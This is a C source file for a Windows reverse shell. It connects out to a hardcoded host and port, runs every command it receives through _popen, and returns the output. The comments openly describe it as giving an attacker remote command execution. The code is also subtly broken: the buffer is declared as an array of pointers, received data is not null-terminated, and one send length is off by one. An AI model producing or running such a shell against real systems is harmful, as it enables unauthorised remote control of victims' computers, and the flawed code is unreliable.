#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

#define LHOST "10.0.1.12"  // Replace with your local IP
#define LPORT 4444        // Replace with your desired listening port

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    char *buffer[1024];
    
    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed. Exiting...\n");
        return 1;
    }

    // Create a socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed. Exiting...\n");
        WSACleanup();
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(LPORT);
    server.sin_addr.s_addr = inet_addr(LHOST);  // Convert the string IP to an address

    // Connect to the attacker’s machine
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        printf("Connection failed. Exiting...\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Redirecting input/output to socket
    while (1) {
        // Receiving commands from the attacker
        recv(sock, buffer, sizeof(buffer), 0);
        
        // Execute the command
        FILE *fp = _popen(buffer, "r");
        if (fp == NULL) {
            send(sock, "Error executing command\n", 23, 0);
        } else {
            // Send the command output back to the attacker
            while (fgets(buffer, sizeof(buffer), fp) != NULL) {
                send(sock, buffer, strlen(buffer), 0);
            }
            fclose(fp);
        }
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
